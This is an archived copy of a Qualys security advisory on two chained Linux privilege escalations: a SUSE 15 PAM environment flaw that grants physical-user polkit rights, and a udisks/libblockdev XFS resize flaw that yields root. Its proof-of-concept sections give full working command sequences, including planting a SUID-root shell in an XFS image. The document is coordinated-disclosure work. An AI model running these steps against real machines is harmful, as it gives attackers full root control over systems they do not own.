---
url: "https://www.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt"
captured: "2026-11-02T19:00:49Z"
via: "live"
source_url: "https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt"
sha256: "e214215900c36aa473b1d237525d522ef5c6885e513c5272b96fc9dd831ceea8"
cited_in:
  - "docs/threats/04-host-integrity-and-hardening-audit.md"
---

# https://www.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://www.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt>


Qualys Security Advisory

CVE-2025-6018: LPE from unprivileged to allow_active in *SUSE 15's PAM
CVE-2025-6019: LPE from allow_active to root in libblockdev via udisks


========================================================================
Contents
========================================================================

Summary
CVE-2025-6018: LPE from unprivileged to allow_active in *SUSE 15's PAM
- Analysis
- Proof of concept
- Digression
CVE-2025-6019: LPE from allow_active to root in libblockdev via udisks
- Analysis
- Proof of concept
Acknowledgments
Timeline


========================================================================
Summary
========================================================================

We discovered an LPE vulnerability (a Local Privilege Escalation) in the
PAM configuration of openSUSE Leap 15 and SUSE Linux Enterprise 15: an
unprivileged local attacker (e.g., an attacker who logs in via sshd) can
obtain the privileges of a physical "allow_active" user (i.e., a user
who is physically sitting in front of the computer) and can therefore
perform all the "allow_active yes" polkit actions that are normally
reserved for physical users.

We also discovered another LPE vulnerability in libblockdev, trivially
exploitable via the udisks daemon, which is installed by default on most
Linux distributions: an "allow_active" user (e.g., a physical user, or
an attacker who hijacked the session of a physical user, or an attacker
who first exploited a vulnerability such as CVE-2025-6018 from this
advisory) can obtain the full privileges of the root user.

We usually prefer LPEs from *any* unprivileged user to full root
(instead of an LPE from an "allow_active" user to full root, like this
CVE-2025-6019), but:

- when combined with the first LPE from this advisory (CVE-2025-6018),
  this second LPE (CVE-2025-6019) effectively allows an *unprivileged*
  attacker to obtain full root privileges;

- several high-profile vulnerabilities published recently also require
  the privileges of an "allow_active" user to be successfully exploited;
  for example, the following outstanding write-ups by Rory McNamara,
  Matthias Gerstner, and Attila Szasz:

  https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/
  https://security.opensuse.org/2024/11/26/tuned-instance-create.html
  https://ssd-disclosure.com/ssd-advisory-linux-kernel-hfsplus-slab-out-of-bounds-write/

Last-minute update: on May 25, 2025, Pumpkin Chang published a must-read
blog post about D-Bus and Polkit, which is particularly relevant to this
advisory because it contains a trick ("Abuse Rule Limitations") that can
allow an unprivileged local attacker (who logs in via sshd for example)
to obtain the privileges of a physical "allow_active" user; for more
information:

  https://u1f383.github.io/linux/2025/05/25/dbus-and-polkit-introduction.html


========================================================================
CVE-2025-6018: LPE from unprivileged to allow_active in *SUSE 15's PAM
========================================================================

________________________________________________________________________

Analysis
________________________________________________________________________

During our recent work on OpenSSH, we noticed that, when an unprivileged
user logs in via sshd on openSUSE Leap 15 or SUSE Linux Enterprise 15:

- PAM's pam_env module (from Linux-PAM 1.3.0) reads this user's
  ~/.pam_environment file by default (i.e., pam_env's "user_readenv"
  configuration option is 1 by default);

- the pam_env module is called first, by sshd's do_pam_setcred(), as
  part of PAM's "auth" stack (from /etc/pam.d/common-auth);

- the pam_systemd module is called later, by sshd's do_pam_session(), as
  part of PAM's "session" stack (from /etc/pam.d/common-session).

Consequently, an unprivileged attacker who logs in via sshd can force
the pam_env module to add arbitrary variables to PAM's environment (by
first writing them to ~/.pam_environment), and these variables are then
returned to the pam_systemd module by pam_getenv(). In particular, the
pam_systemd module calls pam_getenv() for the XDG_SEAT and XDG_VTNR
variables, which immediately reminded us of Jann Horn's excellent
CVE-2019-3842 in systemd:

  https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1812316

In a nutshell, by setting XDG_SEAT=seat0 and XDG_VTNR=1 in
~/.pam_environment, an unprivileged attacker who logs in via sshd on
openSUSE Leap 15 or SUSE Linux Enterprise 15 can pretend that they are,
in fact, a physical user who is sitting in front of the computer; i.e.,
an "allow_active" user, in polkit parlance.

________________________________________________________________________

Proof of concept
________________________________________________________________________

As a concrete result, such an attacker can then perform all the
"allow_active yes" polkit actions that are normally reserved for
physical users. For example, in the following proof of concept, the
attacker calls systemd-logind's CanReboot() method to determine whether
they are authenticated as an unprivileged "allow_any" user (CanReboot()
returns "challenge") or as a physical "allow_active" user (CanReboot()
returns "yes"):

------------------------------------------------------------------------
attacker# ssh -i id_ed25519 nobody@victim

victim> grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="openSUSE Leap 15.6"

victim> id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)

victim> cat /usr/share/polkit-1/actions/org.freedesktop.login1.policy
...
        <action id="org.freedesktop.login1.reboot">
                <description gettext-domain="systemd">Reboot the system</description>
...
                        <allow_any>auth_admin_keep</allow_any>
                        <allow_inactive>auth_admin_keep</allow_inactive>
                        <allow_active>yes</allow_active>
...

victim> gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('challenge',)

victim> { echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > .pam_environment

victim> exit

attacker# ssh -i id_ed25519 nobody@victim

victim> gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('yes',)
------------------------------------------------------------------------

Last-minute note: SUSE Linux Enterprise Server 15 uses "restrictive"
polkit settings, instead of the "standard" settings; consequently, we
must call CanSuspend() (which is "auth_admin_keep:auth_admin_keep:yes")
instead of CanReboot() (which is "auth_admin_keep") to determine whether
we are authenticated as a physical "allow_active" user or not.

We will explore one easy way to transform this minor LPE (from an
unprivileged user to an "allow_active" user) into a full root LPE, in
the next section of this advisory; but first, a brief digression.

________________________________________________________________________

Digression
________________________________________________________________________

On Debian 12 and Ubuntu 24.04, when an unprivileged user logs in via
sshd, PAM's pam_env module (from Linux-PAM 1.5.x) also reads this user's
~/.pam_environment file, because pam_env's "user_readenv" is explicitly
set to 1 in /etc/pam.d/sshd (it is 0 by default, since Linux-PAM 1.4.0).

However, unlike openSUSE Leap and SUSE Linux Enterprise, Debian and
Ubuntu only call the pam_env module at the very end of PAM's "session"
stack, so this user's arbitrary PAM variables (from ~/.pam_environment)
cannot interfere with the pam_sm_open_session() code of the pam_systemd
module.

Nevertheless, we noticed that, by setting the XDG_SESSION_ID variable
(in ~/.pam_environment) to another user's session id, an unprivileged
local attacker can interfere with the pam_sm_close_session() code of the
pam_systemd module, and hence with this other user's session (mark it as
"closing" instead of "active", and delete its .ref FIFO, for example):

------------------------------------------------------------------------
attacker$ ssh evey@victim
evey@victim's password: 

victim$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"

victim$ id
uid=1001(evey) gid=1001(evey) groups=1001(evey),100(users)

victim$ ls -l /run/systemd/sessions
total 8
-rw-r--r-- 1 root root 314 May 13 21:25 4
prw------- 1 root root   0 May 13 21:25 4.ref
-rw-r--r-- 1 root root 310 May 13 21:33 6
prw------- 1 root root   0 May 13 21:33 6.ref

victim$ cat /run/systemd/sessions/4
# This is private data. Do not parse.
UID=1000
USER=theadmin
...
STATE=active
...
FIFO=/run/systemd/sessions/4.ref
...

victim$ echo 'XDG_SESSION_ID OVERRIDE=4' > .pam_environment

victim$ exit

attacker$ ssh evey@victim
evey@victim's password: 

victim$ exit

attacker$ ssh evey@victim
evey@victim's password: 

victim$ ls -l /run/systemd/sessions
total 8
-rw-r--r-- 1 root root 313 May 13 22:13 16
prw------- 1 root root   0 May 13 22:13 16.ref
-rw-r--r-- 1 root root 315 May 13 22:04 4

victim$ cat /run/systemd/sessions/4
# This is private data. Do not parse.
UID=1000
USER=theadmin
...
STATE=closing
...
TTY=pts/0
TTY_VALIDITY=from-utmp
...
------------------------------------------------------------------------

We were unable to transform this interference with pam_systemd's
pam_sm_close_session() into an LPE, but maybe more creative minds will.
In any case, we recommend that all Linux distributions explicitly set
pam_env's "user_readenv" to 0 (if not 0 by default); indeed, and as
highlighted in the latest versions of pam_env's man page:

------------------------------------------------------------------------
user_readenv=0|1

Turns on or off the reading of the user specific environment file. 0 is
off, 1 is on. By default this option is off as user supplied environment
variables in the PAM environment could affect behavior of subsequent
modules in the stack without the consent of the system administrator.

Due to problematic security this functionality is deprecated since the
1.5.0 version and will be removed completely at some point in the
future.
------------------------------------------------------------------------


========================================================================
CVE-2025-6019: LPE from allow_active to root in libblockdev via udisks
========================================================================

________________________________________________________________________

Analysis
________________________________________________________________________

Armed with our "unprivileged to allow_active" LPE, we obviously decided
to hunt for an "allow_active to root" LPE, and therefore grepped for
"allow_active yes" polkit actions:

------------------------------------------------------------------------
victim> grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions
/usr/share/polkit-1/actions/org.freedesktop.login1.policy
/usr/share/polkit-1/actions/org.freedesktop.ModemManager1.policy
/usr/share/polkit-1/actions/org.freedesktop.NetworkManager.policy
/usr/share/polkit-1/actions/com.redhat.tuned.policy
/usr/share/polkit-1/actions/org.fedoraproject.FirewallD1.desktop.policy.choice
/usr/share/polkit-1/actions/org.fedoraproject.FirewallD1.server.policy.choice
/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
------------------------------------------------------------------------

As lovers of filesystems and race conditions, we decided to target the
udisks daemon, which is installed by default on most Linux distributions
and which allows, for example, an "allow_active" user to:

- set up a loop device that is backed by an arbitrary filesystem image
  provided by this user;

- mount this arbitrary loop-backed filesystem.

Naturally, to prevent such an "allow_active" user from trivially
escalating their privileges to full root (by planting a SUID-root
program or a special device in their filesystem image), the udisks
daemon always mounts such a filesystem with the nosuid and nodev flags.

Our initial idea, then, was to trick the udisks daemon into mounting a
loop-backed filesystem without the nosuid and nodev flags, because these
flags cross various layers of complex code before eventually reaching
the kernel, and each of these layers parses and escapes these mount
flags and options differently; for example, to mount an ntfs-3g
filesystem via udisks, these flags and options are:

- first interpreted by the udisks daemon itself;

- then passed to and re-interpreted by the libblockdev;

- then passed to and re-interpreted by the libmount;

- then passed to and re-interpreted by the ntfs-3g program;

- then passed to and re-interpreted by ntfs-3g's internal libfuse;

- and finally passed to and re-interpreted by the kernel itself.

However, as we were reading the code of udisks and libblockdev, we
spotted a much simpler LPE: since 2017, the udisks daemon allows an
"allow_active" user to resize their filesystems; and to resize an XFS
filesystem (via the xfs_growfs program, which is installed by default on
most Linux distributions) the udisks daemon calls the libblockdev, which
temporarily mounts this XFS filesystem in /tmp (if it is not mounted
elsewhere already) but *without* the nosuid and nodev flags.

Consequently, an "allow_active" attacker can simply set up a loop device
that is backed by an arbitrary XFS image (which contains a SUID-root
shell), then request the udisks daemon to resize this XFS filesystem
(which mounts it in /tmp *without* the nosuid and nodev flags), and
finally execute their SUID-root shell (from their XFS filesystem in
/tmp) and therefore obtain full root privileges.

________________________________________________________________________

Proof of concept
________________________________________________________________________

1/ On our own attacker machine, as root, we create an XFS image that
contains a SUID-root shell, and copy it to the victim machine:

------------------------------------------------------------------------
attacker# dd if=/dev/zero of=./xfs.image bs=1M count=300

attacker# mkfs.xfs ./xfs.image

attacker# mkdir ./xfs.mount

attacker# mount -t xfs ./xfs.image ./xfs.mount

attacker# cp /bin/bash ./xfs.mount

attacker# chmod 04555 ./xfs.mount/bash

attacker# umount ./xfs.mount

attacker# scp -i id_ed25519 ./xfs.image nobody@victim:
------------------------------------------------------------------------

2/ We log in the victim machine, and make sure that we are authenticated
as an "allow_active" user (if not, it may be necessary to first exploit
another LPE such as CVE-2025-6018 from this advisory):

------------------------------------------------------------------------
attacker# ssh -i id_ed25519 nobody@victim

victim> grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="openSUSE Leap 15.6"

victim> id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)

victim> gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('yes',)
------------------------------------------------------------------------

3/ We set up a loop device that is backed by our XFS image, but we first
make sure that "gvfs-udisks2-volume-monitor" is not running as our user
(otherwise it would automatically mount our XFS filesystem and prevent
the libblockdev from mounting it itself later):

------------------------------------------------------------------------
victim> killall -KILL gvfs-udisks2-volume-monitor

victim> udisksctl loop-setup --file ./xfs.image --no-user-interaction
Mapped file ./xfs.image as /dev/loop0.
------------------------------------------------------------------------

4/ We request the udisks daemon to resize our XFS filesystem, which
forces the libblockdev to mount it in /tmp without the nosuid and nodev
flags, but we first run a tight loop that will keep our XFS filesystem
busy and prevent it from being unmounted later by the libblockdev:

------------------------------------------------------------------------
victim> while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &

victim> gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: target is busy

-r-sr-xr-x. 1 root root 1406608 May 13 09:42 /tmp/blockdev.RSM842/bash
------------------------------------------------------------------------

5/ Finally, we execute our SUID-root shell (from our XFS filesystem in
/tmp) and therefore obtain full root privileges:

------------------------------------------------------------------------
victim> mount
...
/dev/loop0 on /tmp/blockdev.RSM842 type xfs (rw,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)

victim> /tmp/blockdev*/bash -p

victim# id
uid=65534(nobody) gid=65534(nobody) euid=0(root) groups=65534(nobody)
                                    ^^^^^^^^^^^^
------------------------------------------------------------------------


========================================================================
Acknowledgments
========================================================================

We thank SUSE (Alexander Bergmann, Thomas Blume, Valentin Lefebvre, in
particular) and Red Hat (Patrick Del Bello, Marco Benatto, Tomas Bzatek,
in particular) for their work on this release. We also thank the members
of the linux-distros@openwall (Salvatore Bonaccorso and Nick Tait in
particular) for their help with this release.

Finally, we thank Gergely Kalman for the following inspiring
presentation:

  https://gergelykalman.com/the-forgotten-art-of-filesystem-magic-alligatorcon-2024-slides.html


========================================================================
Timeline
========================================================================

2025-05-14: We sent a draft of our advisory to SUSE (security@suse) and
Red Hat (secalert@redhat).

2025-06-09: We sent a draft of our advisory, and SUSE's and Red Hat's
patches, to the linux-distros@openwall.

2025-06-17: Coordinated Release Date (16:00 UTC).

